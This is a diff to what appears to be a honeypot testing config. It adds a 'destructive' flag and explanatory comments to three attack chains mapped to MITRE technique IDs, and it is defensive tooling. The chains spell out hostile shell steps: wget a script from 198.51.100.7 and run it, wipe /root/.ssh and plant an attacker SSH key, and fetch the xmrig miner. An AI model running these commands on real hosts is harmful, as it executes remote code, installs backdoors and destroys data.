@@ -1,6 +1,29 @@
-version: "1"
+version: "2"
+
+# `destructive: true` means at least one step has REAL side effects when the
+# target does not simulate commands -- it deletes, writes, or executes
+# something on the machine at the other end.
+#
+# Against Cowrie every step is emulated and none of this touches anything,
+# which is the entire reason these chains are safe to run and the reason the
+# flag is about the TARGET, not about the chain in isolation. Against a real
+# host (`HoneypotTarget.kind: generic`) they are what they read as: a
+# backdoor key installed, a downloaded script executed, an SSH directory
+# deleted. `runs._run_chains` refuses to execute a destructive chain against
+# a target that does not simulate, and the chain is reported `unknown` --
+# never `not_observed`, because we declined to look rather than looked and
+# found nothing.
+#
+# All three chains are currently destructive, so a generic target runs none
+# of them and scores no `attack_possibilities` at all. That is the honest
+# outcome, not a gap to paper over: these chains ask "can a known attack be
+# carried out here", and the only way to answer it on a real host is to
+# carry the attack out.
+
 chains:
   - id: dropper
+    # `bash malicious_script.sh` executes a downloaded file.
+    destructive: true
     steps:
       - "cd /tmp"
       - "wget http://198.51.100.7/malicious_script.sh"
@@ -8,12 +31,17 @@ chains:
       - "bash malicious_script.sh"
     expected_technique_ids: ["T1105", "T1222.002", "T1059.004"]
   - id: ssh_persistence
+    # `rm -rf /root/.ssh` destroys the host's SSH state, and the `echo`
+    # installs an attacker-controlled key into authorized_keys.
+    destructive: true
     steps:
       - "rm -rf /root/.ssh"
       - "mkdir -p /root/.ssh"
       - "echo ssh-rsa AAAAB3Nza attacker@host >> /root/.ssh/authorized_keys"
     expected_technique_ids: ["T1098.004"]
   - id: miner
+    # `./xmrig` executes a downloaded binary.
+    destructive: true
     steps:
       - "wget http://198.51.100.7/xmrig"
       - "chmod 777 xmrig"
